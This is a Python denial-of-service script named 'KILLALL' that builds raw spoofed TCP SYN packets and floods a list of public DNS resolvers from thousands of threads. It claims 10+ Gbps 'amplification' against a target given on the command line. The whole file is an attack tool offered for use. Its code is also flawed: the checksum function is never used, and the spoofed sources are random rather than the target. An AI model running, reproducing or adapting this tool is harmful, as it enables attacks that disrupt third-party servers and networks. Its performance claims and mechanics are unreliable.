#!/usr/bin/env python3
"""
🔥 KILLALL - TCP Amplification 10+ Gbps 🔥
TCP reflection/amplification attack
"""

import socket
import random
import sys
import time
import threading
import os
import struct

target = sys.argv[1]
port = int(sys.argv[2])
duration = int(sys.argv[3])
threads = int(sys.argv[4]) if len(sys.argv) > 4 else 2000

# ============================================================
# OPTIMIZED TCP SETTINGS
# ============================================================

# Reflector list (common TCP services)
REFLECTORS = [
    "8.8.8.8", "1.1.1.1", "9.9.9.9", "4.2.2.4", "8.8.4.4",
    "208.67.222.222", "208.67.220.220", "1.0.0.1", "76.76.19.19",
    "94.140.14.14", "94.140.15.15", "185.12.64.2", "185.12.65.2",
    "199.85.126.10", "199.85.127.10", "195.46.39.39", "195.46.39.40",
    "64.6.64.6", "64.6.65.6", "156.154.70.1", "156.154.71.1",
]

# ============================================================
# TCP PACKET BUILDING
# ============================================================

def create_tcp_packet(src_ip, dst_ip, src_port, dst_port, seq, ack, flags, window):
    """Create raw TCP packet"""
    # IP Header
    ip_ihl = 5
    ip_ver = 4
    ip_tos = 0
    ip_tot_len = 20 + 20  # IP + TCP
    ip_id = random.randint(1, 65535)
    ip_frag_off = 0
    ip_ttl = 255
    ip_proto = 6  # TCP
    ip_check = 0
    ip_saddr = socket.inet_aton(src_ip)
    ip_daddr = socket.inet_aton(dst_ip)
    
    ip_header = struct.pack('!BBHHHBBH4s4s',
        (ip_ver << 4) + ip_ihl,
        ip_tos,
        ip_tot_len,
        ip_id,
        ip_frag_off,
        ip_ttl,
        ip_proto,
        ip_check,
        ip_saddr,
        ip_daddr
    )
    
    # TCP Header
    tcp_sport = src_port
    tcp_dport = dst_port
    tcp_seq = seq
    tcp_ack = ack
    tcp_offset = 5
    tcp_flags = flags
    tcp_window = window
    tcp_check = 0
    tcp_urg = 0
    
    tcp_header = struct.pack('!HHLLBBHHH',
        tcp_sport,
        tcp_dport,
        tcp_seq,
        tcp_ack,
        (tcp_offset << 4) + 0,
        tcp_flags,
        tcp_window,
        tcp_check,
        tcp_urg
    )
    
    return ip_header + tcp_header

def calculate_checksum(data):
    """Calculate IP/TCP checksum"""
    if len(data) % 2 != 0:
        data += b'\x00'
    s = sum(struct.unpack('!%dH' % (len(data)//2), data))
    s = (s >> 16) + (s & 0xFFFF)
    s += s >> 16
    return (~s) & 0xFFFF

# ============================================================
# TCP FLOOD WORKER
# ============================================================

def tcp_worker(thread_id):
    """TCP flood worker using raw sockets"""
    try:
        # Create raw socket
        s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
        s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 1024*1024*8)
        
        end_time = time.time() + duration
        count = 0
        src_ports = [53, 80, 443, 8080, 8443, 123, 161, 389, 3306, 21, 22, 25, 110, 143, 993, 995]
        
        while time.time() < end_time:
            try:
                # Choose random reflector
                reflector = random.choice(REFLECTORS)
                src_ip = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
                src_port = random.choice(src_ports)
                seq = random.randint(1, 4294967295)
                ack = 0
                flags = 0x02  # SYN flag
                window = 5840
                
                packet = create_tcp_packet(src_ip, reflector, src_port, port, seq, ack, flags, window)
                s.sendto(packet, (reflector, port))
                count += 1
                
                if count % 10000 == 0:
                    sys.stderr.write(f"KILLALL #{thread_id}: {count} packets\n")
            except:
                pass
        s.close()
        sys.stderr.write(f"KILLALL #{thread_id} completed\n")
    except:
        pass

print(f"""
╔═══════════════════════════════════════════════════════════════╗
║  🔥 KILLALL - TCP Amplification 🔥                          ║
╠═══════════════════════════════════════════════════════════════╣
║  Target: {target}:{port}                                     ║
║  Duration: {duration}s                                       ║
║  Threads: {threads}                                          ║
║  Reflectors: {len(REFLECTORS)}                              ║
║  Method: TCP SYN reflection                                 ║
╚═══════════════════════════════════════════════════════════════╝
""")

for i in range(threads):
    threading.Thread(target=tcp_worker, args=(i,), daemon=True).start()

time.sleep(duration + 2)
